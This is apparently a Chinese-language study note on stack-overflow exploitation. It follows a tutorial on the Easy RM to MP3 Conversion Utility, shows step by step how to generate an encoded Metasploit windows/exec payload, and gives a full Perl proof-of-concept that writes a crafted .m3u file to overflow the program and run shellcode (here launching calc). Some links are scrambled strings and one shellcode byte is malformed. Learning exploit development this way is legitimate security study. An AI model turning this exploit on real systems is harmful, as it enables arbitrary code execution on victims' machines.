
文章中说metasploit提供了payload生成器，但是并没有说怎么用，直接给出了最后的结果，所以我搜索了一下这方面的内容。

### 3.4.1 使用metasploit生成payload

安装完成metasploit之后，在命令行里输入`msfconsole`就可以启动metasploit了。如果不确定要使用哪个payload，可以在命令行里输入 `use payload`，然后按几下TAB键，metasploit就会显示出所有可用的payload。

`use payload/windows/exec` 选择这个payload，然后输入`help`，查看帮助信息，可以看到payload支持的命令：

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9 | `Payload Commands`  `=``=``=``=``=``=``=``=``=``=``=``=``=``=``=``=`    `Command       Description`  `-``-``-``-``-``-``-`       `-``-``-``-``-``-``-``-``-``-``-`  `check         Check to see` `if` `a target` `is` `vulnerable`  `generate      Generates a payload`  `reload`        `Reload` `the current module` `from` `disk`  `to_handler    Creates a handler with the specified payload` |

这里要选择generate命令，输入`generate -h`查看帮助信息：

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23 | `Usage: generate [options]`    `Generates a payload. Datastore options may be supplied after normal options.`    `Example: generate` `-``f python LHOST``=``127.0``.``0.1`    `OPTIONS:`    `-``E        Force encoding`  `-``O <opt>  Deprecated: alias` `for` `the` `'-o'` `option`  `-``P <opt>  Total desired payload size, auto``-``produce appropriate NOP sled length`  `-``S <opt>  The new section name to use when generating (large) Windows binaries`  `-``b <opt>  The` `list` `of characters to avoid example:` `'\x00\xff'`  `-``e <opt>  The encoder to use`  `-``f <opt>  Output` `format``: base32,base64,bash,c,csharp,dw,dword,``hex``,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx``-``exe,axis2,dll,elf,elf``-``so,exe,exe``-``only,exe``-``service,exe``-``small,hta``-``psh,jar,jsp,loop``-``vbs,macho,msi,msi``-``nouac,osx``-``app,psh,psh``-``cmd,psh``-``net,psh``-``reflection,python``-``reflection,vba,vba``-``exe,vba``-``psh,vbs,war`  `-``h        Show this message`  `-``i <opt>  The number of times to encode the payload`  `-``k        Preserve the template behavior` `and` `inject the payload as a new thread`  `-``n <opt>  Prepend a nopsled of [length] size on to the payload`  `-``o <opt>  The output` `file` `name (otherwise stdout)`  `-``p <opt>  The platform of the payload`  `-``v        Verbose output (display stage` `in` `addition to stager)`  `-``x <opt>  Specify a custom executable` `file` `to use as a template` |

有几个选项比较重要：

1. `-P`：指定想要的payload的长度，在这次实验中不需要
2. `-b`：不希望payload中出现的字符
3. `-e`：使用的编码器
4. `-f`：指定输出的语言，这里选择perl

使用`show options`查看这个payload可以设置的选项：

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8 | `msf6 payload(windows``/``exec``) > show options`    `Module options (payload``/``windows``/``exec``):`    `Name      Current Setting  Required  Description`  `-``-``-``-`      `-``-``-``-``-``-``-``-``-``-``-``-``-``-``-`  `-``-``-``-``-``-``-``-`  `-``-``-``-``-``-``-``-``-``-``-`  `CMD                        yes       The command string to execute`  `EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)` |

使用set命令来设置这些选项：

|  |  |
| --- | --- |
| 1  2  3  4 | `msf6 payload(windows``/``exec``) >` `set` `cmd calc`  `cmd` `=``> calc`  `msf6 payload(windows``/``exec``) >` `set` `exitfunc seh`  `exitfunc` `=``> seh` |

使用`show encoders`可以查看支持的编码器，这里不再贴出，一般来metasploit会自己选择最合适的编码器，但是如果你对payload的输出有特殊要求，也可以自己指定想要的编码器。

文章中提到了使用`encoder/x86/alpha_upper`编码器，Alpha2 Alphanumeric Uppercase Encoder，顾名思义，它会使用数字和大写字母生成payload。因为Easy RM to MP3 Conversion Utility对文件的合法字符有要求，但是我们又无法确定哪些是非法字符，所以保险的做法就是保证payload中只包含文件名允许字符。

最后使用`generate -b "\x00" -e x86/alpha_upper -f perl`生成payload

## 3.5 测试exploit

整合上面的信息，得到如下perl脚本：

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47 | `my $``file``=` `"exploit.m3u"``;`  `my $junk``=` `"A"` `x` `26090``;`  `my $eip``=` `pack(``'V'``,``0x0227135b``);`  `# 注意这里要填充一些nop指令，否则shellcode无法正确执行`  `my $beforeshellcode` `=` `"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"``;`  `# windows/exec - 446 bytes`  `# fb4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6i4c8S2M7%4m8D9L8$3W2@1i4K6u0W2j5$3!0E0i4K6u0r3`  `# Encoder: x86/alpha_upper`  `# VERBOSE=false, PrependMigrate=false, EXITFUNC=seh, CMD=calc`  `my $buf` `=`  `"\x89\xe1\xdb\xd4\xd9\x71\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x43"` `.`  `"\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58\x33\x30\x56\x58"` `.`  `"\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42"` `.`  `"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"` `.`  `"\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x5a\x48"` `.`  `"\x4b\x32\x33\x30\x35\x50\x35\x50\x53\x50\x4b\x39\x5a\x45"` `.`  `"\x30\x31\x39\x50\x43\x54\x4c\x4b\x46\x30\x56\x50\x4c\x4b"` `.`  `"\x51\x42\x34\x4c\x4c\x4b\x36\x32\x55\x44\x4c\x4b\x44\x32"` `.`  `"\x51\x38\x54\x4f\x58\x37\x31\x5a\x51\x36\x36\x51\x4b\x4f"` `.`  `"\x4e\x4c\x57\x4c\x35\x31\x33\x4c\x34\x42\x56\x4c\x37\x50"` `.`  `"\x59\x51\x38\x4f\x44\x4d\x33\x31\x39\x57\x4a\x42\x4b\x42"` `.`  `"\x51\x42\x56\x37\x4c\x4b\x50\x52\x42\x30\x4c\x4b\x30\x4a"` `.`  `"\x47\x4c\x4c\x4b\x30\x4c\x52\x31\x42\x58\x4a\x43\x51\x58"` `.`  `"\x55\x51\x58\x51\x46\x31\x4c\x4b\x36\x39\x47\x50\x33\x31"` `.`  `"\x39\x43\x4c\x4b\x57\x39\x34\x58\x4d\x33\x36\x5a\x30\x49"` `.`  `"\x4c\x4b\x56\x54\x4c\x4b\x35\x51\x39\x46\x46\x51\x4b\x4f"` `.`  `"\x4e\x4c\x4f\x31\x48\x4f\x54\x4d\x53\x31\x59\x57\x37\x48"` `.`  `"\x4b\x50\x44\x35\x4a\x56\x34\x43\x33\x4d\x4c\x38\x57\x4b"` `.`  `"\x53\x4d\x37\x54\x42\x55\x4a\x44\x36\x38\x4c\x4b\x56\x38"` `.`  `"\x37\x54\x35\x51\x39\x43\x52\x46\x4c\x4b\x54\x4c\x50\x4b"` `.`  `"\x4c\x4b\x30\x58\x45\x4c\x43\x31\x59\x43\x4c\x4b\x43\x34"` `.`  `"\x4c\x4b\x45\x51\x48\x50\x4c\x49\x47\x34\x47\x54\x36\x44"` `.`  `"\x51\x4b\x31\x4b\x55\x31\x56\x39\x30\x5a\x56\x31\x4b\x4f"` `.`  `"\x4b\x50\x51\x4f\x31\x4f\x50\x5a\x4c\x4b\x45\x42\x4a\x4b"` `.`  `"\x4c\x4d\x31\x4d\x42\x4a\x35\x51\x4c\x4d\x4d\x55\x58\x32"` `.`  `"\x55\x50\x55\x50\x55\x50\x36\x30\x33\x58\x30\x31\x4c\x4b"` `.`  `"\x52\x4f\x4b\x37\x4b\x4f\x58\x55\x4f\x4b\x4b\x4e\x34\x4e"` `.`  `"\x30\x32\x4a\x4a\x43\x58\x39\x36\x5a\x35\x4f\x4d\x4d\x4d"` `.`  `"\x4b\x4f\x49\x45\x47\x4c\x54\x46\x43\x4c\x44\x4a\x4b\x30"` `.`  `"\x4b\x4b\x4d\x30\x34\x35\x53\x35\x4f\x4k\x57\x37\x52\x33"` `.`  `"\x34\x32\x52\x4f\x42\x4a\x35\x50\x30\x53\x4b\x4f\x48\x55"` `.`  `"\x32\x43\x45\x31\x42\x4c\x53\x53\x35\x50\x41\x41"``;`    `open``($``FILE``,``">$file"``);`  `print` `$``FILE` `$junk.$eip.$beforeshellcode.$buf;`  `close($``FILE``);`  `print` `"m3u File Created successfully\n"``;` |

生成poc文件之后，可以成功弹出计算器。

# 4. 知识点整理

1. `pattern_create.rb`及`pattern_offset.rb`脚本的使用方法
2. `windbg`确定指令机器码及搜索机器码地址的方法
3. 其他确定机器码的方法：
   1. [findjmp](https://bbs.kanxue.com/elink@8faK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4y4W2j5%4g2J5K9i4c8W2j5h3#2Q4x3X3g2U0L8$3#2Q4x3V1k6@1L8$3!0D9M7#2)9J5c8U0g2x3f1o6m8o6x3g2m8q4g2g2W2Q4x3X3g2Z5N6r3#2D9)
   2. metasploit opcode database: 8e1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4k6h3u0Q4x3X3g2S2M7X3y4Z5K9i4k6W2i4K6u0W2L8%4u0Y4i4K6u0r3N6$3g2T1i4K6u0r3x3U0l9H3z5o6l9%4x3o6b7I4x3e0l9#2x3e0N6Q4x3V1k6Z5N6s2c8H3i4K6y4m8i4K6u0r3i4K6u0r3N6%4N6%4i4K6u0W2L8h3g2@1j5i4y4H3L8r3!0A6N6q4)9J5k6h3!0J5k6#2)9J5c8Y4g2K6k6i4u0K6i4K6u0r3L8%4m8U0L8$3c8W2i4K6u0r3L8i4y4X3L8%4m8U0L8$3c8W2i4K6u0W2j5$3N6A6
   3. `memdump`: 之后的文章会介绍到
   4. `pvefindaddr`: Immunity插件
4. msf生成payload的方法以及注意事项

# 5. 总结

除了上面的几个知识点之外，比较有意思的其实是这篇文章的思考角度。在学习0day安全的时候，只有前面的栈溢出（也是本篇文章介绍的内容，所以重复较大）介绍的很详细，后面的内容更倾向于原理而不是漏洞利用，而后来我开始看《漏洞战争》，更多的是对漏洞本身的调试分析，漏洞利用的角度学习的也很少。

在这篇文章中，没有poc，没有payload，一切都需要你自己生成，整个漏洞利用的流程介绍的非常详细。

由于只是第一篇文章，很多问题上仍旧只是浅尝辄止，比如shellcode的放置位置、shellcode的前面为什么要填充nop指令、除了jmp esp之外是否还有其他到达shellcode的方法，这些问题都还没有深入讲解。

希望等我看完整个系列教程之后，能够自己编写出之前分析的漏洞的利用程序。( •\_•)

# 6. 参考资料
